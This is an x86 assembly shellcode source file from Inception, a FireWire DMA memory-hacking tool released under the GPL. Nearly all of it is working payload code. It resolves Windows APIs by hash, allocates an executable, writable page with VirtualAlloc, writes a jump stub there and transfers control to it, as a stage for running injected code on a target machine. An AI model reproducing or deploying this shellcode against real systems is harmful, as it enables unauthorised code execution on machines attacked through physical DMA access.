; Inception - a FireWire physical memory manipulation and hacking tool exploiting
; IEEE 1394 SBP-2 DMA.

; Copyright (C) 2011-2013  Carsten Maartmann-Moe

; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.

; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.

; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Created on Sep 6, 2011

; @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
[BITS 32]
[ORG 0]


	call prestart			; push eip on stack for recovery
prestart:
	pusha					; save all registers for later use

	cld						; Clear the direction flag.
	call start				; Call start, this pushes the address of 'api_call' onto the stack.
delta:						;
%include "block_api.asm" 	;
start:                   	;
	pop ebp                	; Pop off the address of 'api_call' for calling later.

allocate_size:
	mov esi,0x100

allocate:
	push byte 0x40          ; PAGE_EXECUTE_READWRITE
	push 0x1000             ; MEM_COMMIT
	push esi                ; Push the length value of the wrapped code block
	push byte 0             ; NULL as we dont care where the allocation is.
	push 0xE553A458         ; hash( "kernel32.dll", "VirtualAlloc" )
	call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

; Copy pattern to new page and then jump to it
	mov word [eax], 0xe0ff  ; Copy jmp eax (0xffe0) to the address stored in eax
	jmp eax					; jump to page
